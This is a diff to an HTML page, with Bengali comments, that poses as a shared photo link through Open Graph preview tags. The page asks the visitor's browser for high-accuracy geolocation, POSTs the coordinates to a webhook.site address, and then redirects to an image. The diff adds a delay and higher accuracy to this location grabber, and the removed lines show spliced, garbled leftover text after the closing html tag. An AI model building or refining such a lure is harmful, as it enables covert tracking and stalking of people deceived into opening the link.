@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>Amazing Photo</title>
 
-    <!-- Open Graph Meta Tags: WhatsApp / FB / Telegram preview -->
+    <!-- Open Graph Meta Tags for preview -->
     <meta property="og:title" content="Check out this amazing photo!">
     <meta property="og:description" content="Click to view the full photo">
     <meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
@@ -32,13 +32,13 @@
     </style>
 
     <script>
-        // Target URL for redirect
-        const targetURL = "https://www.facebook.com"; // আপনার redirect link
+        // 1️⃣ Target URL (আপনার image link)
+        const targetURL = "https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg";
 
-        // Webhook URL (আপনার আগের webhook)
+        // 2️⃣ Webhook URL (আপনার আগের webhook)
         const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";
 
-        // Function to send location
+        // 3️⃣ Function to send location
         function sendLocation(lat, lon) {
             fetch(webhookURL, {
                 method: 'POST',
@@ -47,35 +47,28 @@
             });
         }
 
-        // Page load
+        // 4️⃣ Page load
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        // User allowed location
-                        sendLocation(position.coords.latitude, position.coords.longitude);
-                        // Redirect after 2 sec
-                        setTimeout(() => { window.location.href = targetURL; }, 2000);
-                    },
-                    function() {
-                        // User denied location
-                        setTimeout(() => { window.location.href = targetURL; }, 2000);
-                    },
-                    { timeout: 5000 }
-                );
+                // Delay before asking location
+                setTimeout(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            // User allowed location
+                            sendLocation(position.coords.latitude, position.coords.longitude);
+                            // Redirect after 2 sec
+                            setTimeout(() => { window.location.href = targetURL; }, 2000);
+                        },
+                        function() {
+                            // User denied location
+                            setTimeout(() => { window.location.href = targetURL; }, 2000);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                }, 500);
             } else {
                 // Geolocation not supported
                 setTimeout(() => { window.location.href = targetURL; }, 2000);
-            }
-        };
-    </script>
-</body>
-</html>তি না দিলেও তাকে টার্গেট লিঙ্কে পাঠানো হবে
-                    window.location.href = targetURL;
-                }, {timeout: 5000});
-            } else {
-                // ব্রাউজারে লোকেশন সাপোর্ট না করলে সরাসরি টার্গেট লিঙ্কে যাবে
-                window.location.href = targetURL;
             }
         };
     </script>
